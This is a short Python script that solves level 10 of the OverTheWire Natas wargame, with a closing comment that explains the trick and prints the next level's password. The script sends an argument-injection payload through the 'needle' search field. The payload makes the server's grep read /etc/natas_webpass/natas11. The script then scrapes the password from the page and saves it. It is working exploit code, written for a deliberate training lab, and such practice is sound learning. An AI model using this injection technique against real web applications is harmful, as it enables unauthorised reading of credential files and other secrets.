from bs4 import BeautifulSoup
import requests
import re

lvl = '10'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()

url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)

my_params = {'needle':'-v "fuck" /etc/natas_webpass/natas11 #', 'submit':'Search'} #This is where the magic happens.
soup = BeautifulSoup(requests.get(url=url,auth=lvl_pass, params=my_params).text, 'html.parser')

pw=re.search(r"[a-zA-Z0-9]{32}",soup.find("div",id="content").text)[0]
open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)


'''
Another puzzle near and dear to my heart. Requires one to read the grep manpage.
I chose the word "fuck" in the grep search, because the '-v' flag inverts the search results
(That is, returns all lines which DON'T match the search criteria), and I was fairly confident
that the password for natas11 was not "fuck", and would therefore be returned.

Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

'''
